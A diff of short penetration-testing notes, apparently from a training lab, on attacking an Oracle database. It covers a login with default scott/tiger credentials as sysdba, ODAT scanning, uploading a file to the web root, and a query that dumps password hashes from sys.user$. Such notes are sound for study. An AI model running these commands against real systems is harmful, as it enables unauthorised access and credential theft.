@@ -1,11 +1,12 @@
 # Oracle Database connect
 ```
 sqlplus scott/tiger@10.129.204.235/XE
+sqlplus scott/tiger@10.129.204.235/XE as sysdba
 ```
 # ODAT
 ### Test Oracle Database 
 ```
-odat all -s 10.129.204.235
+sudo odat all -s 10.129.204.235
 ```
 ### Upload file to web server path 
 ```
@@ -26,3 +27,6 @@ curl -X GET http://10.129.204.235/testing.txt
 | `C:\\inetpub\\wwwroot` | Destination directory on the Windows server |
 | `testing.txt` | Destination filename |
 | `./testing.txt` | Local source file |
+### command 
+select * from user_role_privs;  
+select name, password from sys.user$;
